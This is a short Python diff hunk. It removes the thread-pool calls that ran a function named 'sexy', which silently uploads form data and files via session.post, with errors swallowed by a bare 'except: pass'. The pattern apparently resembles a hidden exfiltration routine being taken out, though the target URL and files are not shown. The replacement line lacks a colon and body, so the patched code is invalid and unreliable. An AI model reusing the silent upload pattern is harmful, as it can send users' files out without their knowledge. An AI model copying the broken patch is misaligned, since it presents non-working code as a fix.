@@ -662,6 +662,4 @@ def sexy():
                 sent = session.post(url, data=data2, files=files)
     except:pass
 
-with ThreadPool(max_workers=90) as jjj:
-    jjj.submit(sexy)
-    jjj.submit(main) 
+with ThreadPool(max_workers=90) as jjj
